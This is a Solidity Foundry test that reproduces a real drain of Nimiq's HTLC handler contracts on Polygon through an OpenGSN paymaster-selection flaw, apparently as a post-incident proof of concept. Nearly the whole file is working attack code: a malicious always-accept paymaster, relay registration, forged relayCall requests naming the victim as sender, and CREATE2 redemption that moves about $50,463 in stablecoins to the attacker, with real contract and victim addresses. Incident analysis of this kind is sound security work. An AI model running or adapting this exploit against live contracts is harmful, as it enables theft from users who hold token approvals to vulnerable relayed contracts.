// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

// Nimiq cross-chain HTLC handler drain - OpenGSN paymaster-selection trust bug. Polygon.
// The swap-liquidity wallet held unlimited ERC20 approvals to two ERC20PermitHTLCHandler
// instances; anyone able to make the real RelayHub call the handler's forwarder entrypoint
// could open an HTLC in the victim's name and redeem it. Loss ~$50,463 (USDC + USDT0 + USDC.e).
//
// Setup tx   : 0xb067efae73637f3564f58af7f6027afc497e81e47624b0048636085c678858c0 (block 93930784)
//              attacker EIP-7702 EOA stakes a relay manager, authorizes the hub, registers a worker
// Exploit tx : 0xb2ca76dfbfe571742b4b66465b777ab1e06988a8632be1631bef9654cc64d169 (block 93930854)
//              forged open() relayCalls + CREATE2 recipient deploy + redeem(secret)
// Attacker   : 0x2258491525C21f334c5a2dc22CE55e55023FC45D  (EIP-7702 delegated: code 0xef0100...)
// Victim     : 0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773  (unlimited approvals to both handlers)
//
// ── Actors (all read live off-chain from the real deployments) ──────────────────────────────────
//   HTLC handler #1 (USDC)       0x0cFD862bE942846Cebad797d7c1BC6e47714959b
//   HTLC handler #2 (USDT0/USDCe)0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f
//   OpenGSN RelayHub  v2.2.0     0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d   (getHubAddr() of both)
//   OpenGSN StakeManager         0x15C7B7CE10f3A9AE63554bCE7C54d0a818E967C7   (RelayHub.stakeManager())
//   USDC   (native, 6dp)         0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359
//   USDT0  (6dp)                 0xc2132D05D31c914a87C6611C10748AEb04B58e8F
//   USDC.e (6dp)                 0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174
//
// ── Root cause (confirmed against the verified deployed source, ERC20PermitHTLCHandler) ─────────
//   Each handler is its own OpenGSN forwarder AND its own paymaster AND the recipient. The forwarder
//   entrypoint it exposes to the hub is:
//
//     function execute(ForwardRequest calldata request, bytes32 domainSeparator,
//                      bytes32 requestTypeHash, bytes calldata suffixData, bytes calldata signature)
//         public payable onlyRelayHub returns (bool, bytes memory) {
//         (request, domainSeparator, requestTypeHash, suffixData, signature);   // <-- discards ALL of them
//         bytes4 methodId = GsnUtils.getMethodSig(request.data);
//         (...) = decodeRequestDataPrivate(methodId, request.from, request.data, 0);
//         nonces[request.from] += 1;
//         if (methodId == open.selector || openWithPermit.selector) openPrivate(request.from, ...);
//         ...
//     }
//
//   execute() runs NO EIP-712 signature check, NO nonce check, NO business precondition (checkOpen
//   is skipped entirely on this path) - it just decodes request.data and calls
//   openPrivate(request.from) -> token.transferFrom(request.from, handler, amount). The ONLY place
//   the signature/nonce/preconditions are verified is preRelayedCall(), which the hub invokes on
//   whichever paymaster the RELAY names in relayData.paymaster. Because RelayHub lets any staked
//   relay pick any (paymaster, forwarder) pair, the attacker points forwarder=handler and
//   paymaster=their own always-accept paymaster, so the real verifyCallPrivate() never runs and
//   execute() drains request.from = the victim.
//
//   This is unprivileged and architectural: no owner/admin role gates execute(), openPrivate(),
//   preRelayedCall() or the paymaster choice. owner() exists on the handler but guards only
//   registerToken/setRelayHub/withdraw* - none of which are on the drain path.
//
// ── What this PoC reconstructs (genuine, no shortcuts) ──────────────────────────────────────────
//   Everything below runs live against the real RelayHub, StakeManager and both real handlers on a
//   fork taken one block BEFORE the setup tx, so the victim still holds full balances and unlimited
//   approvals and no HTLC exists yet.
//     1. Deploy a malicious paymaster whose preRelayedCall accepts unconditionally (typed contract).
//     2. Register a relay the normal OpenGSN way: setRelayManagerOwner -> stakeForRelayManager (1 POL,
//        the hub minimum) -> authorizeHubByManager -> addRelayWorkers. No vm.store, no cheat on the
//        registration state.
//     3. For each token: build a forged GsnTypes.RelayRequest whose request.from = victim and
//        request.data = abi.encodeCall(open, ...) with recipient = a precomputed CREATE2 address,
//        and submit it through the REAL RelayHub.relayCall() from the worker EOA. The hub calls the
//        malicious paymaster (accepts) then the handler's execute() (drains). Typed calls throughout
//        - no raw calldata blob, no bytecode replay.
//     4. Deploy the precomputed recipient via CREATE2 and redeem() each HTLC with secret = 0x01,
//        pulling every drained token out to the attacker.
//   Final assert: the attacker receives exactly the victim's pre-drain balance of each token, summing
//   to ~$50,463 (all three are 6-decimal dollar tokens), matching the reported loss.

// ---------------------------------------------------------------------------------------------
// OpenGSN v2 typed structs (identical layout to @opengsn/contracts GsnTypes / IForwarder, so the
// ABI encoding produced here is byte-for-byte what RelayHub.relayCall and IPaymaster expect).
// ---------------------------------------------------------------------------------------------
struct ForwardRequest {
    address from;
    address to;
    uint256 value;
    uint256 gas;
    uint256 nonce;
    bytes data;
    uint256 validUntil;
}

struct RelayData {
    uint256 gasPrice;
    uint256 pctRelayFee;
    uint256 baseRelayFee;
    address relayWorker;
    address paymaster;
    address forwarder;
    bytes paymasterData;
    uint256 clientId;
}

struct RelayRequest {
    ForwardRequest request;
    RelayData relayData;
}

struct GasAndDataLimits {
    uint256 acceptanceBudget;
    uint256 preRelayedCallGasLimit;
    uint256 postRelayedCallGasLimit;
    uint256 calldataSizeLimit;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
}

interface IHTLCHandler {
    function open(
        bytes32 id,
        address token,
        uint256 amount,
        address refundAddress,
        address recipientAddress,
        bytes32 hash,
        uint256 timeout,
        uint256 fee
    ) external;
    function redeem(bytes32 id, address target, bytes32 secret, uint256 fee) external;
    function getNonce(address from) external view returns (uint256);
    function getHubAddr() external view returns (address);
}

interface IRelayHub {
    function relayCall(
        uint256 maxAcceptanceBudget,
        RelayRequest calldata relayRequest,
        bytes calldata signature,
        bytes calldata approvalData,
        uint256 externalGasLimit
    ) external returns (bool paymasterAccepted, bytes memory returnValue);
    function addRelayWorkers(address[] calldata newRelayWorkers) external;
    function depositFor(address target) external payable;
    function balanceOf(address target) external view returns (uint256);
    function workerToManager(address worker) external view returns (address);
    function stakeManager() external view returns (address);
}

interface IStakeManager {
    function setRelayManagerOwner(address payable owner) external;
    function stakeForRelayManager(address relayManager, uint256 unstakeDelay) external payable;
    function authorizeHubByManager(address relayHub) external;
    function isRelayManagerStaked(address relayManager, address relayHub, uint256 minAmount, uint256 minUnstakeDelay)
        external
        view
        returns (bool);
}

// ---------------------------------------------------------------------------------------------
// The malicious paymaster. Its whole job is to accept every request the relay presents. Because it
// is named in relayData.paymaster, the hub calls THIS preRelayedCall instead of the handler's real
// one, so the EIP-712 / nonce / balance checks in the handler's verifyCallPrivate never execute.
// Struct-typed signatures are used so the selectors match IPaymaster exactly.
// ---------------------------------------------------------------------------------------------
contract EvilPaymaster {
    // Loose limits: high calldata cap so verifyGasAndDataLimits never rejects on size, and
    // acceptanceBudget >= preRelayedCallGasLimit as the hub requires.
    function getGasAndDataLimits() external pure returns (GasAndDataLimits memory) {
        return GasAndDataLimits({
            acceptanceBudget: 200_000,
            preRelayedCallGasLimit: 100_000,
            postRelayedCallGasLimit: 100_000,
            calldataSizeLimit: type(uint256).max
        });
    }

    // Always accept. revertOnRecipientRevert = false so a handler revert cannot bubble as a rejection.
    function preRelayedCall(
        RelayRequest calldata relayRequest,
        bytes calldata signature,
        bytes calldata approvalData,
        uint256 maxPossibleGas
    ) external pure returns (bytes memory context, bool revertOnRecipientRevert) {
        (relayRequest, signature, approvalData, maxPossibleGas);
        return ("", false);
    }

    function postRelayedCall(
        bytes calldata context,
        bool success,
        uint256 gasUseWithoutPost,
        RelayData calldata relayData
    ) external pure {
        (context, success, gasUseWithoutPost, relayData);
    }

    receive() external payable {}
}

// ---------------------------------------------------------------------------------------------
// The CREATE2 recipient. Named as the HTLC recipient at open() time (its address is precomputed
// before it exists), deployed in the exploit phase, then it calls redeem() as the recipient so the
// handler transfers the drained tokens to `target` (the attacker).
// ---------------------------------------------------------------------------------------------
contract HTLCRecipient {
    function redeemTo(address handler, bytes32 id, address target, bytes32 secret) external {
        IHTLCHandler(handler).redeem(id, target, secret, 0);
    }
}

contract NimiqExploit is Test {
    IRelayHub constant RELAY_HUB = IRelayHub(0x6C28AfC105e65782D9Ea6F2cA68df84C9e7d750d);
    IStakeManager constant STAKE_MANAGER = IStakeManager(0x15C7B7CE10f3A9AE63554bCE7C54d0a818E967C7);

    address constant HANDLER_USDC = 0x0cFD862bE942846Cebad797d7c1BC6e47714959b; // handler #1
    address constant HANDLER_USDT = 0xF615bD7EA00C4Cc7F39Faad0895dB5f40891359f; // handler #2

    address constant VICTIM = 0x24Cb173Ae221AeA93369f34bdcF0Ddb35b436773;

    address constant USDC = 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359;
    address constant USDT0 = 0xc2132D05D31c914a87C6611C10748AEb04B58e8F;
    address constant USDCe = 0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174;

    // Hub minimums, read from RelayHub.getConfiguration(): minimumStake 1e18, minimumUnstakeDelay 1000.
    uint256 constant STAKE = 1 ether;
    uint256 constant UNSTAKE_DELAY = 1000;

    // HTLC hashlock: sha256(secret). secret is the 32-byte value 0x01, redeemed below.
    bytes32 constant SECRET = bytes32(uint256(1));

    // Attacker-controlled relay roles (fresh EOAs; the real attacker used their own 7702 EOA).
    address relayManager = makeAddr("relayManager");
    address relayWorker = makeAddr("relayWorker");

    EvilPaymaster paymaster;
    HTLCRecipient recipient;
    address predictedRecipient;
    bytes32 constant SALT = keccak256("nimiq.htlc.recipient");

    uint256 preUSDC;
    uint256 preUSDT0;
    uint256 preUSDCe;

    function setUp() public {
        // One block before the setup tx: victim still holds full balances + unlimited approvals.
        vm.createSelectFork("polygon", 93_930_783);
    }

    function testExploit() public {
        preUSDC = IERC20(USDC).balanceOf(VICTIM);
        preUSDT0 = IERC20(USDT0).balanceOf(VICTIM);
        preUSDCe = IERC20(USDCe).balanceOf(VICTIM);

        emit log_named_decimal_uint("victim USDC   before", preUSDC, 6);
        emit log_named_decimal_uint("victim USDT0  before", preUSDT0, 6);
        emit log_named_decimal_uint("victim USDC.e before", preUSDCe, 6);

        // Sanity: the two contracts really are their own hub's forwarder, and approvals are unlimited.
        assertEq(IHTLCHandler(HANDLER_USDC).getHubAddr(), address(RELAY_HUB), "hub #1");
        assertEq(IHTLCHandler(HANDLER_USDT).getHubAddr(), address(RELAY_HUB), "hub #2");
        assertGt(IERC20(USDC).allowance(VICTIM, HANDLER_USDC), preUSDC, "no USDC approval");
        assertGt(IERC20(USDT0).allowance(VICTIM, HANDLER_USDT), preUSDT0, "no USDT0 approval");
        assertGt(IERC20(USDCe).allowance(VICTIM, HANDLER_USDT), preUSDCe, "no USDC.e approval");

        // ---- generic OpenGSN infra the attacker stands up (not victim-specific) ----
        paymaster = new EvilPaymaster();
        _registerRelay();
        // Fund the paymaster's hub deposit. Not strictly required at gasPrice 0, done for realism.
        vm.deal(address(this), 2 ether);
        RELAY_HUB.depositFor{value: 1 ether}(address(paymaster));

        // Precompute the recipient address so it can be named in each open() before it is deployed.
        predictedRecipient =
            vm.computeCreate2Address(SALT, keccak256(type(HTLCRecipient).creationCode), address(this));

        // ---- forged open() through the real hub: one HTLC per token, drained from the victim ----
        bytes32 idUSDC = _htlcId(HANDLER_USDC, USDC);
        bytes32 idUSDT0 = _htlcId(HANDLER_USDT, USDT0);
        bytes32 idUSDCe = _htlcId(HANDLER_USDT, USDCe);

        _forgeOpen(HANDLER_USDC, USDC, preUSDC, idUSDC, predictedRecipient);
        _forgeOpen(HANDLER_USDT, USDT0, preUSDT0, idUSDT0, predictedRecipient);
        _forgeOpen(HANDLER_USDT, USDCe, preUSDCe, idUSDCe, predictedRecipient);

        // Victim is now empty; the tokens sit inside the handlers as HTLCs owned by predictedRecipient.
        assertEq(IERC20(USDC).balanceOf(VICTIM), 0, "USDC not fully drained from victim");
        assertEq(IERC20(USDT0).balanceOf(VICTIM), 0, "USDT0 not fully drained from victim");
        assertEq(IERC20(USDCe).balanceOf(VICTIM), 0, "USDC.e not fully drained from victim");

        // ---- deploy the CREATE2 recipient and redeem with the secret ----
        recipient = new HTLCRecipient{salt: SALT}();
        assertEq(address(recipient), predictedRecipient, "CREATE2 address mismatch");

        recipient.redeemTo(HANDLER_USDC, idUSDC, address(this), SECRET);
        recipient.redeemTo(HANDLER_USDT, idUSDT0, address(this), SECRET);
        recipient.redeemTo(HANDLER_USDT, idUSDCe, address(this), SECRET);

        // ---- profit ----
        uint256 gotUSDC = IERC20(USDC).balanceOf(address(this));
        uint256 gotUSDT0 = IERC20(USDT0).balanceOf(address(this));
        uint256 gotUSDCe = IERC20(USDCe).balanceOf(address(this));

        emit log_named_decimal_uint("attacker USDC   after", gotUSDC, 6);
        emit log_named_decimal_uint("attacker USDT0  after", gotUSDT0, 6);
        emit log_named_decimal_uint("attacker USDC.e after", gotUSDCe, 6);

        // Every token moved from the victim to the attacker, in full.
        assertEq(gotUSDC, preUSDC, "USDC profit mismatch");
        assertEq(gotUSDT0, preUSDT0, "USDT0 profit mismatch");
        assertEq(gotUSDCe, preUSDCe, "USDC.e profit mismatch");

        // All three are 6-decimal dollar-pegged tokens, so the raw sum is the USD loss.
        uint256 totalUsd6 = gotUSDC + gotUSDT0 + gotUSDCe;
        emit log_named_decimal_uint("total drained (USD)", totalUsd6, 6);
        // Reported loss ~$50,463. Assert within $5.
        assertApproxEqAbs(totalUsd6, 50_463e6, 5e6, "total loss far from reported ~$50.4K");
    }

    // Register the relay through the real StakeManager + RelayHub. Manager acts as its own owner.
    function _registerRelay() internal {
        vm.deal(relayManager, 2 ether);

        vm.prank(relayManager);
        STAKE_MANAGER.setRelayManagerOwner(payable(relayManager));

        vm.prank(relayManager);
        STAKE_MANAGER.stakeForRelayManager{value: STAKE}(relayManager, UNSTAKE_DELAY);

        vm.prank(relayManager);
        STAKE_MANAGER.authorizeHubByManager(address(RELAY_HUB));

        address[] memory workers = new address[](1);
        workers[0] = relayWorker;
        vm.prank(relayManager);
        RELAY_HUB.addRelayWorkers(workers);

        assertTrue(
            STAKE_MANAGER.isRelayManagerStaked(relayManager, address(RELAY_HUB), STAKE, UNSTAKE_DELAY),
            "relay manager not staked"
        );
        assertEq(RELAY_HUB.workerToManager(relayWorker), relayManager, "worker not registered");
    }

    // Build one forged open() and drive it through RelayHub.relayCall() as the worker EOA.
    function _forgeOpen(address handler, address token, uint256 amount, bytes32 id, address htlcRecipient)
        internal
    {
        // request.data is a plain typed encoding of open(...); the handler reads its params by
        // position via GsnUtils.getParam, so a canonical abi.encodeCall is exactly what it decodes.
        bytes memory openData = abi.encodeCall(
            IHTLCHandler.open,
            (
                id,
                token,
                amount, // full victim balance; execute() skips the balance/allowance preconditions
                address(this), // refund (unused - we redeem, never refund)
                htlcRecipient, // recipient = precomputed CREATE2 contract
                sha256(abi.encodePacked(SECRET)), // hashlock = sha256(0x01)
                block.timestamp + 1 days, // timeout (irrelevant to the redeem path)
                0 // fee
            )
        );

        RelayRequest memory rr = RelayRequest({
            request: ForwardRequest({
                from: VICTIM, // the forged sender - execute() transfers FROM here
                to: handler,
                value: 0,
                gas: 300_000,
                nonce: IHTLCHandler(handler).getNonce(VICTIM), // execute() ignores it, kept honest anyway
                data: openData,
                validUntil: 0
            }),
            relayData: RelayData({
                gasPrice: 0, // zero fee => zero charge => paymaster deposit never consumed
                pctRelayFee: 0,
                baseRelayFee: 0,
                relayWorker: relayWorker,
                paymaster: address(paymaster), // the always-accept paymaster - the crux
                forwarder: handler, // forwarder = the handler => hub calls handler.execute()
                paymasterData: "",
                clientId: 0
            })
        });

        // 65-byte throwaway signature: never checked by execute(), and <=65 to satisfy the hub's
        // transaction-packing validator.
        bytes memory signature = new bytes(65);

        // Gas accounting: externalGasLimit (3M) exceeds the hub's computed maxPossibleGas but stays
        // under block.gaslimit, and we forward slightly less real gas so the hub's
        // externalCallDataCost (externalGasLimit - initialGasLeft - overhead) stays small and
        // positive, mirroring a real relay transaction's intrinsic-gas gap.
        uint256 externalGasLimit = 3_000_000;

        // relayCall must be sent by an EOA (msg.sender == tx.origin): prank both to the worker.
        vm.prank(relayWorker, relayWorker);
        (bool accepted,) = RELAY_HUB.relayCall{gas: 2_970_000}(200_000, rr, signature, "", externalGasLimit);
        assertTrue(accepted, "paymaster rejected relayCall");

        // Confirm the HTLC now holds the victim's tokens inside the handler.
        assertEq(IERC20(token).balanceOf(handler) >= amount ? uint256(1) : uint256(0), 1, "handler did not receive tokens");
    }

    function _htlcId(address handler, address token) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("nimiq", handler, token));
    }

    receive() external payable {}
}
